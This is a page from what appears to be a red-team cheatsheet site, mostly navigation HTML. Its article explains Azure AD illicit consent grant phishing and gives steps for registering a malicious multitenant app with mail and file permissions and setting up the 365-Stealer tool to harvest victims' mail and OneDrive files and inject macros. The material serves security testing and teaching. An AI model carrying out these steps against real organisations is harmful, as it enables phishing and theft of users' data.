    <li class="md-nav__item">
      <a href="../../../cheatsheets/shell-bind-cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bind Shell
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/shell-reverse-cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Reverse Shell Cheat Sheet
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/source-code-management-ci/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Source Code Management & CI/CD Compromise
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Cloud
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Cloud
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1" >
        
          
          <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Aws
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_1">
            <span class="md-nav__icon md-icon"></span>
            Aws
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/AWS%20Pentest/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cloud - AWS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-access-token/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Access Token & Secrets
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-cognito/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - Cognito
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-dynamodb/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - DynamoDB
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-ec2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - EC2
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-enumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Enumerate
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-iam/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Identity & Access Management
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-ioc-detection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - IOC & Detections
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-lambda/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - Lambda
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-metadata/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Metadata SSRF
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-s3-bucket/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - S3 Buckets
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-ssm/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - SSM
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-training/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Training
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" checked>
        
          
          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Azure
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_4_2">
            <span class="md-nav__icon md-icon"></span>
            Azure
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-access-and-token/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure AD Tokens
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-ad-connect/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure AD Connect
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-devices-users-sp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure AD IAM
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-enumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure AD Enumerate
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-persistence/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Persistence
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Azure AD Phishing
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Azure AD Phishing
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#illicit-consent-grant" class="md-nav__link">
    <span class="md-ellipsis">
      Illicit Consent Grant
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Illicit Consent Grant">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#register-application" class="md-nav__link">
    <span class="md-ellipsis">
      Register Application
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#configure-application" class="md-nav__link">
    <span class="md-ellipsis">
      Configure Application
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#setup-365-stealer-deprecated" class="md-nav__link">
    <span class="md-ellipsis">
      Setup 365-Stealer (Deprecated)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vajra" class="md-nav__link">
    <span class="md-ellipsis">
      Vajra
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#roadtx" class="md-nav__link">
    <span class="md-ellipsis">
      Roadtx
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#device-code-phishing" class="md-nav__link">
    <span class="md-ellipsis">
      Device Code Phishing
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#phishing-with-evilginx2" class="md-nav__link">
    <span class="md-ellipsis">
      Phishing with Evilginx2
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Phishing with Evilginx2">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#internal-phishing-power-platform" class="md-nav__link">
    <span class="md-ellipsis">
      Internal Phishing - Power Platform
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      References
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-requirements/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Requirements
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-application-endpoint/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Application Endpoint
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-application-proxy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Application Proxy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-container-registry/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Container Registry
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-deployment-template/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Deployment Template
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-devops/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Azure DevOps
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-keyvault/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - KeyVault
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-microsoft-intune/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Microsoft Intune
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-office-365/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Office 365
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-runbook/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Runbook and Automation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-storage-blob/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Storage Blob
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-virtual-machine/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Virtual Machine
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-web-apps/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Web Apps
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Command control
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Command control
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../command-control/cobalt-strike/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cobalt Strike
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../command-control/metasploit/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Metasploit
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Containers
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            Containers
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../containers/docker/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Docker
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../containers/kubernetes/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kubernetes
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
        
          
          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Methodology
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            Methodology
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../methodology/bug-hunting-methodology/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bug Hunting Methodology
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../methodology/vulnerability-reports/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vulnerability Reports
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Redteam
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            Redteam
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_1" >
        
          
          <label class="md-nav__link" for="__nav_8_1" id="__nav_8_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Access
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_1">
            <span class="md-nav__icon md-icon"></span>
            Access
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/access/attack-surface-enumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Subdomains Enumeration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/access/html-smuggling/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTML Smuggling
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/access/initial-access/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Initial Access
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/access/office-attacks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Office - Attacks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/access/windows-download-execute/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - Download and execute methods
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/access/windows-using-credentials/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - Using credentials
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_2" >
        
          
          <label class="md-nav__link" for="__nav_8_2" id="__nav_8_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Escalation
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_2">
            <span class="md-nav__icon md-icon"></span>
            Escalation
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/escalation/linux-privilege-escalation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux - Privilege Escalation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/escalation/windows-privilege-escalation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - Privilege Escalation
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_3" >
        
          
          <label class="md-nav__link" for="__nav_8_3" id="__nav_8_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Evasion
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_3">
            <span class="md-nav__icon md-icon"></span>
            Evasion
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/evasion/linux-evasion/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux - Evasion
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/evasion/windows-amsi-bypass/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - AMSI Bypass
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/evasion/windows-defenses/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - Defenses
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/evasion/windows-dpapi/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - DPAPI
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_4" >
        
          
          <label class="md-nav__link" for="__nav_8_4" id="__nav_8_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Persistence
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_4">
            <span class="md-nav__icon md-icon"></span>
            Persistence
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/persistence/linux-persistence/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux - Persistence
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/persistence/windows-persistence/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - Persistence
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_5" >
        
          
          <label class="md-nav__link" for="__nav_8_5" id="__nav_8_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Pivoting
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_5">
            <span class="md-nav__icon md-icon"></span>
            Pivoting
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/pivoting/network-pivoting-techniques/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Network Pivoting Techniques
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#illicit-consent-grant" class="md-nav__link">
    <span class="md-ellipsis">
      Illicit Consent Grant
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Illicit Consent Grant">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#register-application" class="md-nav__link">
    <span class="md-ellipsis">
      Register Application
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#configure-application" class="md-nav__link">
    <span class="md-ellipsis">
      Configure Application
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#setup-365-stealer-deprecated" class="md-nav__link">
    <span class="md-ellipsis">
      Setup 365-Stealer (Deprecated)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vajra" class="md-nav__link">
    <span class="md-ellipsis">
      Vajra
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#roadtx" class="md-nav__link">
    <span class="md-ellipsis">
      Roadtx
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#device-code-phishing" class="md-nav__link">
    <span class="md-ellipsis">
      Device Code Phishing
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#phishing-with-evilginx2" class="md-nav__link">
    <span class="md-ellipsis">
      Phishing with Evilginx2
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Phishing with Evilginx2">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#internal-phishing-power-platform" class="md-nav__link">
    <span class="md-ellipsis">
      Internal Phishing - Power Platform
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      References
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  
  


<h1 id="azure-ad-phishing">Azure AD Phishing</h1>
<h2 id="illicit-consent-grant">Illicit Consent Grant</h2>
<blockquote>
<p>The attacker creates an Azure-registered application that requests access to data such as contact information, email, or documents. The attacker then tricks an end user into granting consent to the application so that the attacker can gain access to the data that the target user has access to. </p>
</blockquote>
<p>Check if users are allowed to consent to apps: <code>PS AzureADPreview&gt; (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole</code></p>
<ul>
<li><strong>Disable user consent</strong> : Users cannot grant permissions to applications.   </li>
<li><strong>Users can consent to apps from verified publishers or your organization, but only for permissions you select</strong> : All users can only consent to apps that were published by a verified publisher and apps that are registered in your tenant    </li>
<li><strong>Users can consent to all apps</strong> : allows all users to consent to any permission which doesn't require admin consent.    </li>
<li><strong>Custom app consent policy</strong>   </li>
</ul>
<h3 id="register-application">Register Application</h3>
<ol>
<li>Login to https://portal.azure.com &gt; Azure Active Directory</li>
<li>Click on <strong>App registrations</strong> &gt; <strong>New registration</strong></li>
<li>Enter the Name for our application</li>
<li>Under support account types select <strong>"Accounts in any organizational directory (Any Azure AD directory - Multitenant)"</strong></li>
<li>Enter the Redirect URL. This URL should be pointed towards our 365-Stealer application that we will host for hosting our phishing page. Make sure the endpoint is <code>https://&lt;DOMAIN/IP&gt;:&lt;PORT&gt;/login/authorized</code>.</li>
<li>Click <strong>Register</strong> and save the <strong>Application ID</strong></li>
</ol>
<h3 id="configure-application">Configure Application</h3>
<ol>
<li>Click on <code>Certificates &amp; secrets</code></li>
<li>Click on <code>New client secret</code> then enter the <strong>Description</strong> and click on <strong>Add</strong>.</li>
<li>Save the <strong>secret</strong>'s value.</li>
<li>Click on API permissions &gt; Add a permission</li>
<li>Click on Microsoft Graph &gt; <strong>Delegated permissions</strong></li>
<li>Search and select the below mentioned permissions and click on Add permission<ul>
<li>Contacts.Read </li>
<li>Mail.Read / Mail.ReadWrite</li>
<li>Mail.Send</li>
<li>Notes.Read.All</li>
<li>Mailboxsettings.ReadWrite</li>
<li>Files.ReadWrite.All </li>
<li>User.ReadBasic.All</li>
<li>User.Read</li>
</ul>
</li>
</ol>
<h3 id="setup-365-stealer-deprecated">Setup 365-Stealer (Deprecated)</h3>
<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> Default port for 365-Stealer phishing is 443</p>
<ul>
<li>Run XAMPP and start Apache</li>
<li>Clone 365-Stealer into <code>C:\xampp\htdocs\</code><ul>
<li><code>git clone https://github.com/AlteredSecurity/365-Stealer.git</code></li>
</ul>
</li>
<li>Install the requirements<ul>
<li>Python3</li>
<li>PHP CLI or Xampp server</li>
<li><code>pip install -r requirements.txt</code></li>
</ul>
</li>
<li>Enable sqlite3 (Xampp &gt; Apache config &gt; php.ini) and restart Apache</li>
<li>Edit <code>C:/xampp/htdocs/yourvictims/index.php</code> if needed<ul>
<li>Disable IP whitelisting <code>$enableIpWhiteList = false;</code></li>
</ul>
</li>
<li>Go to 365-Stealer Management portal &gt; Configuration (http://localhost:82/365-stealer/yourVictims)<ul>
<li><strong>Client Id</strong> (Mandatory): This will be the Application(Client) Id of the application that we registered.</li>
<li><strong>Client Secret</strong> (Mandatory): Secret value from the Certificates &amp; secrets tab that we created.</li>
<li><strong>Redirect URL</strong> (Mandatory): Specify the redirect URL that we entered during registering the App like <code>https://&lt;Domain/IP&gt;/login/authorized</code> </li>
<li><strong>Macros Location</strong>: Path of macro file that we want to inject.</li>
<li><strong>Extension in OneDrive</strong>: We can provide file extensions that we want to download from the victims account or provide <code>*</code> to download all the files present in the victims OneDrive. The file extensions should be comma separated like txt, pdf, docx etc. </li>
<li><strong>Delay</strong>: Delay the request by specifying time in seconds while stealing</li>
</ul>
</li>
<li>Create a Self Signed Certificate to use HTTPS</li>
<li>Run the application either click on the button or run this command : <code>python 365-Stealer.py --run-app</code><ul>
<li><code>--no-ssl</code>: disable HTTPS</li>
<li><code>--port</code>: change the default listening port</li>
<li><code>--token</code>: provide a specific token</li>
<li><code>--refresh-token XXX --client-id YYY --client-secret ZZZ</code>: use a refresh token</li>
</ul>
</li>
<li>Find the Phishing URL: go to <code>https://&lt;IP/Domain&gt;:&lt;Port&gt;</code> and click on <strong>Read More</strong> button or in the console.</li>
</ul>
<h3 id="vajra">Vajra</h3>
<blockquote>
<p>Vajra is a UI-based tool with multiple techniques for attacking and enumerating in the target's Azure environment. It features an intuitive web-based user interface built with the Python Flask module for a better user experience. The primary focus of this tool is to have different attacking techniques all at one place with web UI interfaces. - https://github.com/TROUBLE-1/Vajra</p>
</blockquote>
